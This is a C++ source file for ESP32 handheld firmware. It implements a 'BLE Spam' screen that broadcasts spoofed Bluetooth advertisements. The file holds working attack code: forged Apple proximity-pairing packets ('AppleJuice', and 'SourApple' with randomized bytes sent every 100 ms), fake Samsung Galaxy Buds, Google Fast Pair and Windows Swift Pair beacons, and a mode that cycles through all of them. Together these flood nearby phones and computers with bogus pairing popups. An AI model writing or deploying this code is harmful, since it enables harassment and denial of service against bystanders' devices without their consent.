#include "BleBeaconActivity.h"

#include <BLEDevice.h>
#include <GfxRenderer.h>
#include <Logging.h>
#include <esp_random.h>

#include "MappedInputManager.h"
#include "components/UITheme.h"
#include "fontIds.h"
#include "util/RadioManager.h"

constexpr const char* BleBeaconActivity::MODE_NAMES[];

// Apple device type bytes (little-endian)
static const uint8_t APPLE_DEVICE_TYPES[][2] = {
    {0x20, 0x02},  // AirPods
    {0x20, 0x0E},  // AirPods Pro
    {0x20, 0x0A},  // AirPods Max
    {0x20, 0x13},  // AirPods Gen3
    {0x25, 0x02},  // AppleTV
};
static constexpr int APPLE_DEVICE_COUNT = 5;

// Google Fast Pair model IDs
static const uint32_t GOOGLE_MODEL_IDS[] = {
    0x000047,  // Google device
    0x00B727,  // Pixel Buds A
    0xCD8256,  // Pixel Buds Pro
    0x0000F0,  // Bose QC35
};
static constexpr int GOOGLE_MODEL_COUNT = 4;

void BleBeaconActivity::onEnter() {
  Activity::onEnter();
  RADIO.ensureBle();

  state = MODE_SELECT;
  modeIndex = 0;
  packetsSent = 0;
  startTime = 0;
  lastCycleTime = 0;
  deviceTypeIndex = 0;
  platformIndex = 0;
  pAdvertising = nullptr;

  requestUpdate();
}

void BleBeaconActivity::onExit() {
  Activity::onExit();
  stopSpam();
  RADIO.shutdown();
}

void BleBeaconActivity::startSpam(SpamMode mode) {
  activeMode = mode;
  state = SPAMMING;
  packetsSent = 0;
  startTime = millis();
  lastCycleTime = 0;
  deviceTypeIndex = 0;
  platformIndex = 0;

  pAdvertising = BLEDevice::getAdvertising();
  pAdvertising->stop();

  requestUpdate();
}

void BleBeaconActivity::stopSpam() {
  if (pAdvertising) {
    pAdvertising->stop();
    pAdvertising = nullptr;
  }
  state = MODE_SELECT;
}

void BleBeaconActivity::randomizeBleAddress() {
  uint8_t addr[6];
  for (int i = 0; i < 6; i++) {
    addr[i] = esp_random() & 0xFF;
  }
  // Set top two bits for random static address
  addr[0] |= 0xC0;
  // Note: ESP32 BLE Arduino library doesn't expose direct addr setting
  // The random data is embedded in the advertisement payload instead
}

void BleBeaconActivity::sendAppleJuicePacket() {
  if (!pAdvertising) return;

  pAdvertising->stop();

  BLEAdvertisementData advData;
  // Apple manufacturer data: company ID 0x004C + proximity pairing prefix + device type
  uint8_t data[] = {0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45,
                    0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  // Set device type
  data[3] = APPLE_DEVICE_TYPES[deviceTypeIndex][0];
  data[4] = APPLE_DEVICE_TYPES[deviceTypeIndex][1];

  std::string mfData;
  // Apple company ID (little-endian): 0x004C
  mfData += (char)0x4C;
  mfData += (char)0x00;
  mfData.append(reinterpret_cast<char*>(data), sizeof(data));

  advData.setManufacturerData(String(mfData.data(), mfData.size()));
  pAdvertising->setAdvertisementData(advData);
  pAdvertising->start();

  packetsSent++;
  deviceTypeIndex = (deviceTypeIndex + 1) % APPLE_DEVICE_COUNT;
}

void BleBeaconActivity::sendSourApplePacket() {
  if (!pAdvertising) return;

  pAdvertising->stop();
  randomizeBleAddress();

  BLEAdvertisementData advData;
  uint8_t data[] = {0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45,
                    0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  data[3] = APPLE_DEVICE_TYPES[deviceTypeIndex][0];
  data[4] = APPLE_DEVICE_TYPES[deviceTypeIndex][1];
  // Randomize some bytes
  for (int i = 5; i < 25; i++) {
    data[i] = esp_random() & 0xFF;
  }

  std::string mfData;
  mfData += (char)0x4C;
  mfData += (char)0x00;
  mfData.append(reinterpret_cast<char*>(data), sizeof(data));

  advData.setManufacturerData(String(mfData.data(), mfData.size()));
  pAdvertising->setAdvertisementData(advData);
  pAdvertising->start();

  packetsSent++;
  deviceTypeIndex = (deviceTypeIndex + 1) % APPLE_DEVICE_COUNT;
}

void BleBeaconActivity::sendSamsungPacket() {
  if (!pAdvertising) return;

  pAdvertising->stop();

  BLEAdvertisementData advData;
  // Samsung company ID 0x0075, Galaxy Buds format
  uint8_t data[] = {0x42, 0x09, 0x01, 0x02, 0x05, 0x01, 0x00, 0x05,
                    0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  // Randomize some payload bytes
  for (int i = 8; i < 16; i++) {
    data[i] = esp_random() & 0xFF;
  }

  std::string mfData;
  mfData += (char)0x75;
  mfData += (char)0x00;
  mfData.append(reinterpret_cast<char*>(data), sizeof(data));

  advData.setManufacturerData(String(mfData.data(), mfData.size()));
  pAdvertising->setAdvertisementData(advData);
  pAdvertising->start();

  packetsSent++;
}

void BleBeaconActivity::sendGoogleFastPairPacket() {
  if (!pAdvertising) return;

  pAdvertising->stop();

  BLEAdvertisementData advData;
  // Google Fast Pair service data with UUID 0xFE2C
  uint32_t modelId = GOOGLE_MODEL_IDS[deviceTypeIndex % GOOGLE_MODEL_COUNT];
  uint8_t svcData[] = {0x2C, 0xFE, (uint8_t)((modelId >> 16) & 0xFF), (uint8_t)((modelId >> 8) & 0xFF),
                       (uint8_t)(modelId & 0xFF), 0x00};

  std::string serviceData;
  serviceData.append(reinterpret_cast<char*>(svcData), sizeof(svcData));
  advData.setServiceData(BLEUUID((uint16_t)0xFE2C), String(serviceData.data(), serviceData.size()));

  pAdvertising->setAdvertisementData(advData);
  pAdvertising->start();

  packetsSent++;
  deviceTypeIndex = (deviceTypeIndex + 1) % GOOGLE_MODEL_COUNT;
}

void BleBeaconActivity::sendWindowsSwiftPairPacket() {
  if (!pAdvertising) return;

  pAdvertising->stop();

  BLEAdvertisementData advData;
  // Microsoft company ID 0x0006, SwiftPair beacon
  uint8_t data[] = {0x03, 0x01, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  // Randomize some bytes for variation
  for (int i = 4; i < 9; i++) {
    data[i] = esp_random() & 0xFF;
  }

  std::string mfData;
  mfData += (char)0x06;
  mfData += (char)0x00;
  mfData.append(reinterpret_cast<char*>(data), sizeof(data));

  advData.setManufacturerData(String(mfData.data(), mfData.size()));
  pAdvertising->setAdvertisementData(advData);
  pAdvertising->start();

  packetsSent++;
}

void BleBeaconActivity::cycleSpamAll() {
  switch (platformIndex) {
    case 0:
      sendAppleJuicePacket();
      break;
    case 1:
      sendSamsungPacket();
      break;
    case 2:
      sendGoogleFastPairPacket();
      break;
    case 3:
      sendWindowsSwiftPairPacket();
      break;
  }
  platformIndex = (platformIndex + 1) % 4;
}

void BleBeaconActivity::loop() {
  if (state == MODE_SELECT) {
    if (mappedInput.wasPressed(MappedInputManager::Button::Back)) {
      finish();
      return;
    }

    if (mappedInput.wasPressed(MappedInputManager::Button::Confirm)) {
      if (modeIndex == STOP) {
        finish();
        return;
      }
      startSpam(static_cast<SpamMode>(modeIndex));
      return;
    }

    buttonNavigator.onNext([this] {
      modeIndex = ButtonNavigator::nextIndex(modeIndex, MODE_COUNT);
      requestUpdate();
    });

    buttonNavigator.onPrevious([this] {
      modeIndex = ButtonNavigator::previousIndex(modeIndex, MODE_COUNT);
      requestUpdate();
    });
    return;
  }

  // SPAMMING state
  if (mappedInput.wasPressed(MappedInputManager::Button::Back)) {
    stopSpam();
    requestUpdate();
    return;
  }

  unsigned long now = millis();
  unsigned long interval = 0;

  switch (activeMode) {
    case APPLE_APPLEJUICE:
      interval = 2000;
      break;
    case APPLE_SOURAPPLE:
      interval = 100;
      break;
    case SAMSUNG:
      interval = 1000;
      break;
    case GOOGLE_FAST_PAIR:
      interval = 1000;
      break;
    case WINDOWS_SWIFTPAIR:
      interval = 1000;
      break;
    case SPAM_ALL:
      interval = 3000;
      break;
    default:
      break;
  }

  if (now - lastCycleTime >= interval) {
    lastCycleTime = now;

    switch (activeMode) {
      case APPLE_APPLEJUICE:
        sendAppleJuicePacket();
        break;
      case APPLE_SOURAPPLE:
        sendSourApplePacket();
        break;
      case SAMSUNG:
        sendSamsungPacket();
        break;
      case GOOGLE_FAST_PAIR:
        sendGoogleFastPairPacket();
        break;
      case WINDOWS_SWIFTPAIR:
        sendWindowsSwiftPairPacket();
        break;
      case SPAM_ALL:
        cycleSpamAll();
        break;
      default:
        break;
    }

    requestUpdate();
  }
}

void BleBeaconActivity::render(RenderLock&&) {
  renderer.clearScreen();

  const auto& metrics = UITheme::getInstance().getMetrics();
  const auto pageWidth = renderer.getScreenWidth();
  const auto pageHeight = renderer.getScreenHeight();

  GUI.drawHeader(renderer, Rect{0, metrics.topPadding, pageWidth, metrics.headerHeight}, "BLE Spam");

  if (state == MODE_SELECT) {
    const int contentTop = metrics.topPadding + metrics.headerHeight + metrics.verticalSpacing;
    const int contentHeight = pageHeight - contentTop - metrics.buttonHintsHeight - metrics.verticalSpacing;

    GUI.drawList(
        renderer, Rect{0, contentTop, pageWidth, contentHeight}, MODE_COUNT, modeIndex,
        [](int index) { return std::string(MODE_NAMES[index]); });

    const auto labels = mappedInput.mapLabels("Back", "Select", "^", "v");
    GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
  } else {
    // SPAMMING display
    const int centerY = pageHeight / 2 - 40;

    // Active mode name (large)
    const char* modeName = (activeMode < MODE_COUNT) ? MODE_NAMES[activeMode] : "Unknown";
    renderer.drawCenteredText(UI_12_FONT_ID, centerY, modeName, true, EpdFontFamily::BOLD);

    // Packets sent counter
    char buf[64];
    snprintf(buf, sizeof(buf), "Packets: %lu", (unsigned long)packetsSent);
    renderer.drawCenteredText(UI_10_FONT_ID, centerY + 35, buf);

    // Elapsed time
    unsigned long elapsed = (millis() - startTime) / 1000;
    snprintf(buf, sizeof(buf), "Time: %lum %lus", elapsed / 60, elapsed % 60);
    renderer.drawCenteredText(UI_10_FONT_ID, centerY + 60, buf);

    const auto labels = mappedInput.mapLabels("Stop", "", "", "");
    GUI.drawButtonHints(renderer, labels.btn1, labels.btn2, labels.btn3, labels.btn4);
  }

  renderer.displayBuffer();
}
